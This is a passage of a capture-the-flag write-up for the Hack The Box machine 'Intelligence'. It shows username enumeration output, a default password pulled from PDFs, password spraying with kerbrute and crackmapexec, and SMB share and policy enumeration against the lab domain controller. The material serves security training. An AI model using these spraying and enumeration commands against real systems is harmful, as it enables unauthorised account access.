2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2024/01/27 01:42:07 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2024/01/27 01:42:08 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2024/01/27 01:42:08 >  Done! Tested 84 usernames (84 valid) in 2.207 seconds
```

Now that I have a list of users, i need to find the password of them, I tried `password-spraying` these users with a basic random password like `Summer2020!` or `Winter2020!` but it didnt work.

So, I went back to enumerate the `pdf` files to see if I could find a password.

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ for i in $(ls); do pdftotext $i; done                                                                                                                                             
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ cat *.txt                
Dolore ut etincidunt adipisci aliquam labore.
Dolore quaerat porro neque amet. Non ipsum quiquia ut dolor modi porro.

.....
.....
SNIP
.....
.....
Voluptatem dolorem quaerat non velit non.

Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.

┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ cat *.txt | grep -i password
Please login using your username and the default password of:
After logging in please change your password as soon as possible.
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ cat *.txt | grep -i password -B5 -A5

Sit porro tempora porro etincidunt adipisci.

New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.

Dolor quisquam aliquam amet numquam modi.
Sit porro tempora sit adipisci porro sit quiquia. Ut dolor modi magnam ipsum
velit magnam. Ipsum ut numquam tempora sit. Tempora eius est voluptatem.
Dolorem numquam consectetur etincidunt etincidunt sed. Neque magnam ipsum modi sit aliquam amet. Amet consectetur modi quisquam adipisci aliquam
```

Found the password: `NewIntelligenceCorpUser9876`

`Password-Spraying` this password for all the users using `kerbrute`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ /opt/kerbrute_linux_amd64 passwordspray --dc 10.10.10.248 -d intelligence.htb users.txt 'NewIntelligenceCorpUser9876'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/27/24 - Ronnie Flathers @ropnop

2024/01/27 01:56:16 >  Using KDC(s):
2024/01/27 01:56:16 >   10.10.10.248:88

2024/01/27 01:56:20 >  Done! Tested 84 logins (0 successes) in 4.520 seconds
```

For some reasons, `kerbrute` didn’t seem to work. So, I tried using `crackmapexec` and it worked.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```

The creds are `Tiffany.Molina:NewIntelligenceCorpUser9876`

Using `--continue-on-success` so that if more than one account matches with that password, It’ll still continue(otherwise it stops on the first success).

Tried using `Evil-WinRM` but it didnt work. So back to using `crackmapexec`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ evil-winrm -i 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876 ' 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876          
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec winrm 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 
SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
HTTP        10.10.10.248    5985   DC               [*] http://10.10.10.248:5985/wsman
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares               
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ
```

Checking out the basics like `password-policy` of the user.

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --pass-pol
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Dumping password info for domain: intelligence
SMB         10.10.10.248    445    DC               Minimum password length: 7
SMB         10.10.10.248    445    DC               Password history length: None
SMB         10.10.10.248    445    DC               Maximum password age: Not Set
SMB         10.10.10.248    445    DC               
SMB         10.10.10.248    445    DC               Password Complexity Flags: 000000
SMB         10.10.10.248    445    DC                   Domain Refuse Password Change: 0
SMB         10.10.10.248    445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.10.248    445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.10.248    445    DC                   Domain Password No Clear Change: 0
SMB         10.10.10.248    445    DC                   Domain Password No Anon Change: 0
SMB         10.10.10.248    445    DC                   Domain Password Complex: 0
SMB         10.10.10.248    445    DC               
SMB         10.10.10.248    445    DC               Minimum password age: None
SMB         10.10.10.248    445    DC               Reset Account Lockout Counter: None
SMB         10.10.10.248    445    DC               Locked Account Duration: None
SMB         10.10.10.248    445    DC               Account Lockout Threshold: None
SMB         10.10.10.248    445    DC               Forced Log off Time: Not Set
```

Using the `Spider_Plus` module that recursively dumps files from remote SMB servers.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxerecursively dumps files from remote SMB serverss/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -M spider_plus
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SPIDER_P... 10.10.10.248    445    DC               [*] Started spidering plus with option:
SPIDER_P... 10.10.10.248    445    DC               [*]        DIR: ['print$']
SPIDER_P... 10.10.10.248    445    DC               [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.10.248    445    DC               [*]       SIZE: 51200
SPIDER_P... 10.10.10.248    445    DC               [*]     OUTPUT: /tmp/cme_spider_plus
SPIDER_P... 10.10.10.248    445    DC               [*] Reconnect to server 4
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SPIDER_P... 10.10.10.248    445    DC               [*] Reconnect to server 3
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SPIDER_P... 10.10.10.248    445    DC               [*] Reconnect to server 2
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SPIDER_P... 10.10.10.248    445    DC               [*] Reconnect to server 1
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SPIDER_P... 10.10.10.248    445    DC               [*] Reconnect to server 0
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

Enumerating the data `spider_plus` gave:

```bash
┌──(darshan㉿kali)-[/tmp/cme_spider_plus]
└─$ cat 10.10.10.248.json | jq '. | keys '
[
  "IPC$",
  "IT",
  "NETLOGON",
  "SYSVOL",
  "Users"
]
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[/tmp/cme_spider_plus]
└─$ cat 10.10.10.248.json | jq '. | map_values(keys) '
{
  "IPC$": [
    "4e6306ce8f5905f5",
    "InitShutdown",
    "LSM_API_service",
    "PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER",
    "RpcProxy\\49683",
    "RpcProxy\\593",
    "W32TIME_ALT",
    "Winsock2\\CatalogChangeListener-1b8-0",
    "Winsock2\\CatalogChangeListener-248-0",
    "Winsock2\\CatalogChangeListener-25c-0",
    "Winsock2\\CatalogChangeListener-25c-1",
    "Winsock2\\CatalogChangeListener-298-0",
    "Winsock2\\CatalogChangeListener-39c-0",
    "Winsock2\\CatalogChangeListener-4ec-0",
    "Winsock2\\CatalogChangeListener-858-0",
    "Winsock2\\CatalogChangeListener-868-0",
    "Winsock2\\CatalogChangeListener-878-0",
    "atsvc",
    "cert",
    "efsrpc",
    "epmapper",
    "eventlog",
    "lsass",
    "netdfs",
    "ntsvcs",
    "scerpc",
    "srvsvc",
    "vgauth-service",
    "wkssvc"
  ],
  "IT": [
    "downdetector.ps1"
  ],
  "NETLOGON": [],
  "SYSVOL": [
    "intelligence.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI",
    "intelligence.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf",
    "intelligence.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI",
